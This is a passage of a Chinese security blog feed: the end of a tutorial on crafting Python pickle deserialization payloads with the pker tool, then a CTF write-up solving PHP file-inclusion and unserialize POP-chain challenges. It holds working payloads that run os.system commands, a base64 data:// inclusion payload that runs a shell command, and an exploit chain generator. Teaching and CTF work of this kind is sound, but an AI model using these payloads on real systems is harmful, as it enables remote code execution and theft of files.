class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">S&#x27;whoami&#x27;</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br><br>(cos\nsystem\nS<span class="hljs-string">&#x27;whoami&#x27;</span>\no.：<br>c：表示引用一个模块。<br>os：表示导入的模块是 Python 的标准库 os。<br>system：引用了 os 模块中的 system 方法。<br>S<span class="hljs-string">&#x27;whoami&#x27;</span>：序列化的字符串，内容为 <span class="hljs-string">&#x27;whoami&#x27;</span>。<br>o：表示调用（对象应用），将字符串作为参数传递给 os.system 方法。<br>.：表示序列化结束。<br></code></pre></td></tr></table></figure><h4 id="实例化对象"><a href="#实例化对象" class="headerlink" title="实例化对象"></a>实例化对象</h4><p>实例化对象是一种特殊的函数执行，这里简单的使用 <code>R</code> 构造一下，其他方式类似：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.age = age<br><br>data=<span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">Student</span><br><span class="hljs-string">(S&#x27;XiaoMing&#x27;</span><br><span class="hljs-string">S&quot;20&quot;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br><br>a=pickle.loads(data)<br><span class="hljs-built_in">print</span>(a.name,a.age)<br><span class="hljs-comment">#创建了student对象</span><br></code></pre></td></tr></table></figure><h1 id="pker"><a href="#pker" class="headerlink" title="pker"></a>pker</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在<a href="https://github.com/eddieivan01/pker%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E3%80%82">https://github.com/eddieivan01/pker下载源码。</a></li><li>使用pker，我们可以更方便地编写pickle opcode（生成pickle版本0的opcode）。</li><li>再次建议，在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。</li></ul><h2 id="pker能做的事"><a href="#pker能做的事" class="headerlink" title="pker能做的事"></a>pker能做的事</h2><blockquote><ul><li>变量赋值：存到memo中，保存memo下标和变量名即可</li><li>函数调用</li><li>类型字面量构造</li><li>list和dict成员修改</li><li>对象成员变量修改</li></ul></blockquote><p>具体来讲，可以使用pker进行原变量覆盖、函数执行、实例化新的对象。</p><h2 id="使用方法与示例"><a href="#使用方法与示例" class="headerlink" title="使用方法与示例"></a>使用方法与示例</h2><ol><li>pker中的针对pickle的特殊语法需要重点掌握</li><li>此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。</li><li>pker主要用到<code>GLOBAL、INST、OBJ</code>三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs sql">以下<span class="hljs-keyword">module</span>都可以是包含`.`的子<span class="hljs-keyword">module</span><br>调用函数时，注意传入的参数类型要和示例一致<br>对应的opcode会被生成，但并不与pker代码相互等价<br><br><span class="hljs-keyword">GLOBAL</span><br>对应opcode：b<span class="hljs-string">&#x27;c&#x27;</span><br>获取<span class="hljs-keyword">module</span>下的一个全局对象（没有import的也可以，比如下面的os）：<br><span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br>输入：<span class="hljs-keyword">module</span>,instance(callable、<span class="hljs-keyword">module</span>都是instance)  <br><br>INST<br>对应opcode：b<span class="hljs-string">&#x27;i&#x27;</span><br>建立并入栈一个对象（可以执行一个函数）：<br>INST(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;ls&#x27;</span>)  <br>输入：<span class="hljs-keyword">module</span>,callable,para <br><br>OBJ<br>对应opcode：b<span class="hljs-string">&#x27;o&#x27;</span><br>建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：<br>OBJ(<span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>), <span class="hljs-string">&#x27;ls&#x27;</span>) <br>输入：callable,para<br><br>xxx(xx,...)<br>对应opcode：b<span class="hljs-string">&#x27;R&#x27;</span><br>使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）<br><br>li[<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-number">321</span><br>或<br>globals_dic[<span class="hljs-string">&#x27;local_var&#x27;</span>]<span class="hljs-operator">=</span><span class="hljs-string">&#x27;hello&#x27;</span><br>对应opcode：b<span class="hljs-string">&#x27;s&#x27;</span><br>更新列表或字典的某项的值<br><br>xx.attr<span class="hljs-operator">=</span><span class="hljs-number">123</span><br>对应opcode：b<span class="hljs-string">&#x27;b&#x27;</span><br>对xx对象进行属性设置<br><br><span class="hljs-keyword">return</span><br>对应opcode：b<span class="hljs-string">&#x27;0&#x27;</span><br>出栈（作为pickle.loads函数的返回值）：<br><span class="hljs-keyword">return</span> xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）<br></code></pre></td></tr></table></figure><p>注意：</p><ol><li>由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。</li><li>pker解析<code>S</code>时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">test</span>=<span class="hljs-string">&quot;123&quot;</span><br><span class="hljs-built_in">return</span> <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>被解析为：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">b<span class="hljs-string">&quot;S&#x27;123&#x27;<span class="hljs-subst">\n</span>p0<span class="hljs-subst">\n</span>0g0<span class="hljs-subst">\n</span>.&quot;</span><br></code></pre></td></tr></table></figure><h4 id="pker：全局变量覆盖"><a href="#pker：全局变量覆盖" class="headerlink" title="pker：全局变量覆盖"></a>pker：全局变量覆盖</h4><ul><li>覆盖直接由执行文件引入的<code>secret</code>模块中的<code>name</code>与<code>category</code>变量：</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">secret</span>=GLOBAL(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;secret&#x27;</span>) <br><span class="hljs-comment"># python的执行文件被解析为__main__对象，secret在该对象从属下</span><br><span class="hljs-attr">secret.name</span>=<span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-attr">secret.category</span>=<span class="hljs-string">&#x27;2&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>覆盖引入模块的变量：</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">game</span> = GLOBAL(<span class="hljs-string">&#x27;guess_game&#x27;</span>, <span class="hljs-string">&#x27;game&#x27;</span>)<br><span class="hljs-attr">game.curr_ticket</span> = <span class="hljs-string">&#x27;123&#x27;</span><br></code></pre></td></tr></table></figure><p>接下来会给出一些具体的基本操作的实例。</p><h4 id="pker：函数执行"><a href="#pker：函数执行" class="headerlink" title="pker：函数执行"></a>pker：函数执行</h4><ul><li>通过<code>b&#39;R&#39;</code>调用：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">s<span class="hljs-operator">=</span><span class="hljs-string">&#x27;whoami&#x27;</span><br><span class="hljs-keyword">system</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-keyword">system</span>(s) # `b<span class="hljs-string">&#x27;R&#x27;</span>`调用<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><ul><li>通过<code>b&#39;i&#39;</code>调用：</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">INST</span><span class="hljs-params">(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;whoami&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><ul><li>通过<code>b&#39;c&#39;</code>与<code>b&#39;o&#39;</code>调用：</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">OBJ</span><span class="hljs-params">(GLOBAL(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)</span></span>, <span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li>多参数调用函数</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">INST</span><span class="hljs-params">(<span class="hljs-string">&#x27;[module]&#x27;</span>, <span class="hljs-string">&#x27;[callable]&#x27;</span>[, par0,par1...])</span></span><br><span class="hljs-function"><span class="hljs-title">OBJ</span><span class="hljs-params">(GLOBAL(<span class="hljs-string">&#x27;[module]&#x27;</span>, <span class="hljs-string">&#x27;[callable]&#x27;</span>)</span></span><span class="hljs-selector-attr">[, par0,par1...]</span>)<br></code></pre></td></tr></table></figure><h4 id="pker：实例化对象"><a href="#pker：实例化对象" class="headerlink" title="pker：实例化对象"></a>pker：实例化对象</h4><ul><li>实例化对象是一种特殊的函数执行</li></ul><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autoit">animal = INST(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">return</span> animal<br><br><br><span class="hljs-meta"># 或者</span><br><br>animal = OBJ(<span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>), <span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">return</span> animal<br></code></pre></td></tr></table></figure><ul><li>其中，python原文件中包含：</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, name, category</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.category = category<br></code></pre></td></tr></table></figure><ul><li>也可以先实例化再赋值：</li></ul><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">animal = INST(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>)<br>animal.name=<span class="hljs-string">&#x27;1&#x27;</span><br>animal.category=<span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-keyword">return</span> animal<br></code></pre></td></tr></table></figure><h4 id="手动辅助"><a href="#手动辅助" class="headerlink" title="手动辅助"></a>手动辅助</h4><ul><li>拼接opcode：将第一个pickle流结尾表示结束的<code>.</code>去掉，两者拼接起来即可。</li><li>建立普通的类时，可以先pickle.dumps，再拼接至payload。</li></ul><p>参考：</p><p><a href="https://xz.aliyun.com/news/7032">https://xz.aliyun.com/news/7032</a> 先知大佬</p><p><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> 官方文档</p><p><a href="https://tttang.com/archive/1294/">https://tttang.com/archive/1294/</a> P神</p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pickle</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>启航杯</title>
    <link href="/2025/01/25/%E5%90%AF%E8%88%AA%E6%9D%AF/"/>
    <url>/2025/01/25/%E5%90%AF%E8%88%AA%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="启航杯2025-1-25"><a href="#启航杯2025-1-25" class="headerlink" title="启航杯2025.1.25"></a>启航杯2025.1.25</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>也是第一次正式比赛akweb啊  呜呜呜 虽然多不难</p><h3 id="Easy-include"><a href="#Easy-include" class="headerlink" title="Easy_include"></a>Easy_include</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))<br>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>,<span class="hljs-variable">$file</span>))<br>    &#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;no no no ~ &quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>简单的文件包含</p><p>payload:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">file</span>=data://text/plain<span class="hljs-comment">;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=</span><br></code></pre></td></tr></table></figure><p>伪协议加编码绕过</p><h3 id="Web-pop"><a href="#Web-pop" class="headerlink" title="Web_pop"></a>Web_pop</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$func</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to QHCTF 2025, &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>    &#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sec</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;CTFers&quot;</span>;<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>    &#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Easy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cla</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$fun</span>, <span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cla = <span class="hljs-keyword">clone</span> <span class="hljs-variable">$var</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eeee</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br> <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>简单的pop</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br><br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sec</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Easy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cla</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$fun</span>, <span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cla = <span class="hljs-keyword">clone</span> <span class="hljs-variable">$var</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eeee</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br><br><br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$a</span>-&gt;name=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sec</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;obj=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Easy</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;<span class="hljs-keyword">var</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">eeee</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;<span class="hljs-keyword">var</span>-&gt;obj=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;<span class="hljs-keyword">var</span>-&gt;obj-&gt;func=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sec</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="PCREMagic"><a href="#PCREMagic" class="headerlink" title="PCREMagic"></a>PCREMagic</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_php</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>     <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?php.*?eval.*?\(.*?\).*?\?&gt;/is&#x27;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>));<br>&#125;<br><br><span class="hljs-variable">$user_dir</span> = <span class="hljs-string">&#x27;data/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_php</span>(<span class="hljs-variable">$data</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;bad request&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$user_dir</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$user_dir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);<br>    &#125;<br>    <span class="hljs-variable">$path</span> = <span class="hljs-variable">$user_dir</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">random_int</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>) . <span class="hljs-string">&#x27;.php&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span 